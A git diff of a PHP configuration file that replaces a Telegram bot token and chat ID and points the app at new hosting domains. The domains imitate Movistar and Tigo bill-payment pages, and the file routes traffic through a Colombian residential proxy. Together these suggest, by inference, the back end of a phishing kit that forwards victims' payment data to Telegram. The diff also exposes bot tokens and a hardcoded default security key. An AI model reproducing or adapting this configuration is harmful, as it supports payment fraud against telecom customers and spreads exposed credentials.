@@ -15,15 +15,15 @@ $db_port = $url['port'] ?? 5432;
 putenv("PGSSLMODE=require");
 
 return [
-    'botToken' => '8334889903:AAFvz341HwSjL3UG3BXq8rQf3RZWj0Gc9dA',
-    'chatId' => '-5141648243',
+    'botToken' => '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo',
+    'chatId' => '-5180034812',
     'db_host' => $db_host,
     'db_user' => $db_user,
     'db_pass' => $db_pass,
     'db_name' => $db_name,
     'db_port' => $db_port,
-    'renderUrl' => 'https://movistarprueba.onrender.com',
-    'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatigo.vercel.app/pagos/updatetele.php',
+    'renderUrl' => 'https://recaudomovistarfast.onrender.com',
+    'baseUrl' => getenv('BASE_URL') ?: 'https://recaudomovistarfast.onrender.com/pagos/updatetele.php',
     'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
     // Proxy Residencial (Bright Data - Colombia)
     'proxy_host' => 'brd.superproxy.io',
